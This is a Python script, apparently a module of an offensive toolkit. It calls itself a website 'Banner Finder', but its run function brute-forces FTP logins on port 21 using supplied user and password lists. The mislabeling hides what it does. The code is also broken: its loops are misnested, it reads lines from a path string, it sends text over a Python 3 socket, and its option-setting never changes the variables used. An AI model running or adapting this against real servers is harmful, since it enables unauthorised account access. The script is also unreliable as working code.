#!/usr/bin/python3
import os ,re,readline,sys
from socket import *

sys.path.append("/data/data/com.termux/files/usr/opt/sandsploit/core")
sys.path.append("/opt/sandsploit/core/")
import complator
host = None
userlist =None
passlist = None
name = "Banner Finder"
author = "@Aμιρ-0x0 (AMJ)"
info = "a Tool for Grab Informations of websites...."

def help():
    print ("author              to show author name")
    print ("help                to show this massage")
    print ("info                to show description of the tool ")
    print ("set                 to set options such as : [set host http://google.com/]")
    print ("show_options        to show options of Tools")
    print ("exit                to quit from Tool")
    print ("run                 to Run Session")
def options():
    print ("options               value")
    print ("==========            ============")
    print ("host                 ",host)
    print ("userlist             ",userlist)
    print ("passlist             ",passlist)

def run():
    userl = open(userlist,"r")
    for users in userl.readlines():
        passl = open(passlist,"r")
    for passwords in passlist.readlines():

        s = socket(AF_INET,SOCK_STREAM)
        s.connect_ex((host,21))
        s.recv(1024)
        s.send('USER %s\r\n'%(users))
        res = s.recv(1024)
        s.send('PASS %s\r\n'%(passwords))
        res = s.recv(1024)
    if re.search('230',res):
        print ("[+] find password ",passwords)
    else:
        print ("[!] try test","user",users,"psss",passwords)
        print ("---------------------------------------------")

while True:
    try:
        option = input ("\033[96m┌─[SSF][\033[91m"+name+"\033[96m]\n└─▪ ")
        op2 = option.split(" ")
        if option == "help":
            help()
        elif option == "author":
            print (author)
        elif option == "info":
            print (info)

        elif option == "show_options":
            options()
        elif op2[0] == "set":
            op3 = op2[1].upper()    
            vars()[op3] = op2[2]
            print ("%s => %s"%(op2[1],op2[2]))
        elif option == "run":
            run()
        elif option == "exit":
            break
        else:
            print ("Wrong Command ! ")
    except:
        print ('Unkonwn Error !')
